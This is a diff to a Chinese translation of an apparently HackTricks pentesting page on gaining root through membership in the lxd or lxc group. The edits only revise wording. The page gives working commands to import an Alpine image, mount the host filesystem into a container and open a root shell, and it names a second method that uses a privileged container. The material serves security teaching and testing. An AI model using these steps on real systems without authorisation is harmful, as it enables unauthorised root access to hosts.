@@ -2,16 +2,14 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-如果你属于 _**lxd**_ **或** _**lxc**_ **组**，就可以成为 root
+如果你属于 _**lxd**_ **或** _**lxc**_ **group**，就可以成为 root
 
-## 无需 internet 的 Exploiting
+## 在没有 internet 的情况下利用
 
 ### Method 1
 
-你可以从可信的 repository 下载一个用于 lxd 的 alpine image。
-
-Canonical 每天都会在其网站上发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-
+你可以从可信的 repository 下载一个 alpine image，以便与 lxd 一起使用。  
+Canonical 每天都会在其站点发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
 只需从最新的构建版本中获取 **lxd.tar.xz** 和 **rootfs.squashfs**。（目录名称就是日期）。
 
 或者，你也可以在自己的机器上安装这个 distro builder：[https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)（按照 github 中的说明操作）：
@@ -37,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-上传 **incus.tar.xz**（如果从 Canonical repository 下载，则为 **lxd.tar.xz**）和 **rootfs.squashfs** 文件，将 image 添加到 repo 并创建一个容器：
+上传 **incus.tar.xz**（如果从 Canonical repository 下载，则使用 **lxd.tar.xz**）和 **rootfs.squashfs** 文件，将镜像添加到 repo 并创建一个 container：
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -53,18 +51,18 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> 如果遇到此错误 _**Error: No storage pool found. Please create a new storage pool**_\
-> 运行 **`lxd init`**，并将所有选项设置为默认值。然后**重新执行**上一段命令
+> 如果发现此错误 _**Error: No storage pool found. Please create a new storage pool**_\
+> 运行 **`lxd init`**，并将所有选项设置为默认值。然后**重复**上一段命令
 
-最后，你可以执行该容器并获得 root 权限：
+最后，你可以执行该 container 并获取 root：
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### 方法 2
+### Method 2
 
-构建一个 Alpine image，并使用标志 `security.privileged=true` 启动它，强制容器以 root 身份与主机文件系统交互。
+构建一个 Alpine image，并使用标志 `security.privileged=true` 启动它，强制容器以 root 身份与宿主机文件系统交互。
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
